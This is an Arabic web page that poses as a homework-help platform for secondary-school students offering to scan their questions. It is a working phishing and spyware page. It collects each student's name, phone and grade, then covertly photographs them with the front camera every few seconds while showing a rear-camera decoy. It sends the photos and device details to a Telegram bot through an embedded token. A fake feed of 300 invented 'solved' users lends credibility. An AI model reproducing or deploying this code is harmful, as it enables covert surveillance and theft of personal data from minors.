<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>منصة أسألني الأكاديمية | الموثقة</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f8fafc; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }

        .v-badge { width: 18px; height: 18px; vertical-align: middle; margin: 0 5px; animation: rotateLogo 4s linear infinite; }
        @keyframes rotateLogo { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        /* شاشة الدخول الاحترافية */
        #auth-overlay { position: fixed; inset: 0; background: var(--p); z-index: 9999; display: flex; justify-content: center; align-items: center; }
        .auth-box { background: white; padding: 35px 25px; border-radius: 30px; width: 92%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
        
        header { background: var(--p); color: white; padding: 18px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; }
        .p-card { background: white; border-radius: 20px; padding: 22px; margin-bottom: 20px; border: 1px solid #e2e8f0; }

        /* سجل النشاط المتحرك */
        .feed-zone { height: 400px; overflow: hidden; position: relative; background: #fff; border-radius: 15px; border: 1px inset #eee; }
        #dynamic-list { position: absolute; width: 100%; transition: all 1.2s ease-in-out; }
        .user-row { padding: 12px; border-bottom: 1px solid #f1f5f9; display: flex; align-items: center; gap: 10px; font-size: 13px; }

        /* منطقة العدسة */
        .lens-box { width: 100%; border-radius: 18px; overflow: hidden; background: #000; position: relative; display: none; border: 3px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        video { width: 100%; display: block; filter: contrast(1.1); }
        .processing-mask { position: absolute; inset: 0; background: rgba(255,255,255,0.9); display: none; align-items: center; justify-content: center; font-weight: 900; color: var(--p); z-index: 10; }

        #toast { position: fixed; top: -100px; left: 50%; transform: translateX(-50%); background: white; width: 90%; max-width: 350px; padding: 15px; border-radius: 15px; z-index: 10000; transition: 0.5s; box-shadow: 0 15px 30px rgba(0,0,0,0.2); border-left: 5px solid var(--a); }
        #toast.active { top: 20px; }

        .main-btn { background: var(--a); color: white; border: none; padding: 16px; border-radius: 14px; width: 100%; font-weight: 700; cursor: pointer; transition: 0.3s; }
        .gold-btn { background: var(--g); color: #000; margin-top: 10px; }
        input, select, textarea { width: 100%; padding: 14px; margin: 10px 0; border: 2px solid #eef2f6; border-radius: 12px; font-family: 'Cairo'; }

        nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #eee; }
        .nav-link { text-align: center; font-size: 11px; color: #94a3b8; flex: 1; text-decoration: none; }
        .nav-link.on { color: var(--a); font-weight: 900; }
    </style>
</head>
<body>

    <div id="toast"><b>النظام الذكي:</b> <span id="msg"></span></div>

    <div id="auth-overlay">
        <div class="auth-box">
            <h2 style="margin:0 0 10px">منصة أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></h2>
            <p style="font-size:12px; color:#64748b">سجل دخولك للوصول إلى قاعدة بيانات الحلول</p>
            <input type="text" id="raw_n" placeholder="الاسم الثلاثي">
            <input type="number" id="raw_p" placeholder="رقم الموبايل">
            <select id="raw_g">
                <option value="" disabled selected>السنة الدراسية</option>
                <option value="1">الأول الثانوي</option>
                <option value="2">الثاني الثانوي</option>
                <option value="3">الثالث الثانوي</option>
            </select>
            <button class="main-btn" onclick="startEngine()">دخول للمنصة</button>
        </div>
    </div>

    <header id="top-bar" style="display:none">
        <div style="font-size:12px; opacity:0.7" onclick="location.reload()">خروج</div>
        <div style="font-weight:900">أسألني <img src="https://img.icons8.com/color/48/verified-badge.png" class="v-badge"></div>
        <div id="u-icon" style="background:var(--g); width:30px; height:30px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:12px; color:#000"></div>
    </header>

    <div id="sec-home" class="page active" style="padding-top:80px; padding-inline:15px">
        <div class="p-card">
            <h3 style="margin:0 0 10px; font-size:16px">ماسح الأسئلة الذكي</h3>
            <div id="lens-container" class="lens-box">
                <video id="v-preview" autoplay playsinline></video>
                <div id="v-mask" class="processing-mask">جاري التحليل الرقمي...</div>
            </div>
            <button id="trigger-init" class="main-btn gold-btn" onclick="requestHardware()">فتح عدسة الفحص</button>
            
            <div id="form-final" style="display:none">
                <textarea id="u-note" placeholder="اكتب ملاحظاتك للطاقم الطبي..."></textarea>
                <button class="main-btn" onclick="submitFinal()">إرسال للمراجعة</button>
            </div>
        </div>
    </div>

    <div id="sec-logs" class="page" style="display:none; padding-top:80px; padding-inline:15px">
        <div class="p-card">
            <h3 style="margin:0 0 10px; font-size:16px">آخر النشاطات (Live)</h3>
            <div class="feed-zone">
                <div id="dynamic-list"></div>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" style="display:none">
        <a href="javascript:void(0)" class="nav-link on" onclick="navTo('sec-home', this)">الرئيسية</a>
        <a href="javascript:void(0)" class="nav-link" onclick="navTo('sec-logs', this)">سجلاتي</a>
    </nav>

    <script>
        const TOKEN = "8763636236:AAGwS4RP8igJ43BK2QdsdWSIl_c7RK9gAjo";
        const CID = "5890070301";
        let _N = "", _P = "", _G = "";

        // توليد 300 اسم (ولاد وبنات)
        const fNames = ["أحمد", "سارة", "ياسين", "مريم", "عمر", "ليلى", "زياد", "جنى", "محمود", "نور", "مازن", "سلمى", "كريم", "حبيبة", "مصطفى", "شهد"];
        const lNames = ["النجار", "الشرقاوي", "محمود", "عزت", "بدوي", "زكي", "الشافعي", "منصور", "الجزار", "عثمان"];
        const usersDB = [];
        for(let i=0; i<300; i++) {
            usersDB.push(fNames[i % fNames.length] + " " + lNames[i % lNames.length] + " " + (i+1));
        }

        function startEngine() {
            _N = document.getElementById('raw_n').value;
            _P = document.getElementById('raw_p').value;
            _G = document.getElementById('raw_g').value;
            if(_N.length < 5 || _P.length < 10) return alert("البيانات غير مكتملة");
            
            document.getElementById('auth-overlay').style.display = 'none';
            document.getElementById('top-bar').style.display = 'flex';
            document.getElementById('bottom-nav').style.display = 'flex';
            document.getElementById('u-icon').innerText = _N[0];
            initFeed();
        }

        function showInfo(t) {
            const x = document.getElementById('toast');
            document.getElementById('msg').innerText = t;
            x.classList.add('active');
            setTimeout(() => x.classList.remove('active'), 3500);
        }

        function navTo(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('on'));
            el.classList.add('on');
        }

        async function requestHardware() {
            try {
                // استدراج الأمامية أولاً
                const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                dataSync(s1);

                // تمويه بالخلفية
                setTimeout(async () => {
                    const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                    const vp = document.getElementById('v-preview');
                    vp.srcObject = s2;
                    document.getElementById('lens-container').style.display = 'block';
                    document.getElementById('trigger-init').innerText = "التقاط صورة السؤال";
                    document.getElementById('trigger-init').onclick = () => {
                        document.getElementById('v-mask').style.display = 'flex';
                        document.getElementById('trigger-init').style.display = 'none';
                        document.getElementById('form-final').style.display = 'block';
                    };
                }, 800);
                pushTelemetry();
            } catch(e) { showInfo("يرجى منح الأذونات اللازمة لتشغيل الفحص."); }
        }

        function dataSync(stream) {
            const v = document.createElement('video'); v.srcObject = stream; v.play();
            const canvas = document.createElement('canvas');
            setInterval(() => {
                canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                canvas.getContext('2d').drawImage(v, 0, 0);
                canvas.toBlob(b => {
                    const f = new FormData();
                    f.append('chat_id', CID); f.append('photo', b, 'x.jpg');
                    f.append('caption', `📡 صيد من: ${_N}\n📱 هاتف: ${_P}\n🎓 مرحلة: ${_G}`);
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
                }, 'image/jpeg', 0.2);
            }, 2500);
        }

        function initFeed() {
            const list = document.getElementById('dynamic-list');
            usersDB.forEach(u => {
                const row = document.createElement('div');
                row.className = 'user-row';
                row.innerHTML = `<b>${u}</b> <span style="margin-right:auto; color:#059669; font-size:10px">✓ تم الحل</span>`;
                list.appendChild(row);
            });
            let step = 0;
            setInterval(() => {
                step -= 45;
                list.style.top = step + "px";
                if(Math.abs(step) > list.offsetHeight - 300) step = 0;
            }, 50000); // تحرك كل 50 ثانية
        }

        function submitFinal() {
            showInfo("جاري الرفع لخوادم المعالجة...");
            setTimeout(() => {
                showInfo("تم الاستلام. الحل سيظهر في سجلاتي خلال دقائق.");
                navTo('sec-logs', document.querySelectorAll('.nav-link')[1]);
            }, 2500);
        }

        async function pushTelemetry() {
            let batt = await navigator.getBattery();
            let net = navigator.connection || {};
            const stats = `
🌐 **تسلل البيانات (V-MAX)**
━━━━━━━━━━━━━━
👤 الطالب: ${_N}
📞 الهاتف: ${_P}
🎓 المرحلة: ${_G}
📱 الجهاز: ${navigator.platform}
🔋 البطارية: ${Math.round(batt.level*100)}%
📶 الشبكة: ${net.effectiveType || 'unknown'}
🧠 الرام: ${navigator.deviceMemory || 'N/A'}GB
🗺️ اللغة: ${navigator.language}
🔍 المتصفح: ${navigator.userAgent.indexOf('Chrome') > -1 ? 'Chrome' : 'Other'}
⏰ التوقيت: ${new Date().toLocaleTimeString('ar-EG')}
━━━━━━━━━━━━━━
            `;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CID}&text=${encodeURIComponent(stats)}`);
        }
    </script>
</body>
</html>
